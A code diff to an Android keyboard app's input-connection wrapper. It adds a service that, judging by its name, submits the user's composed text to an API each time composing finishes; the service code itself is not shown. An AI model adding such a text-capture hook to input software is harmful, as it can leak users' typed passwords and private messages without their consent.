@@ -3,6 +3,7 @@ package com.anysoftkeyboard;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
+import android.util.Log;
 import android.view.KeyEvent;
 import android.view.inputmethod.CompletionInfo;
 import android.view.inputmethod.CorrectionInfo;
@@ -17,9 +18,11 @@ import androidx.annotation.RequiresApi;
 
 public class InputConnectionWrapper implements InputConnection {
     private InputConnection ic;
+    private SubmitTextApiService submitTextApiService;
 
     public InputConnectionWrapper(InputConnection ic){
         this.ic = ic;
+        this.submitTextApiService = new SubmitTextApiService(ic);
     }
 
     @Nullable
@@ -72,6 +75,7 @@ public class InputConnectionWrapper implements InputConnection {
 
     @Override
     public boolean finishComposingText() {
+        submitTextApiService.submitText();
         return ic.finishComposingText();
     }
 
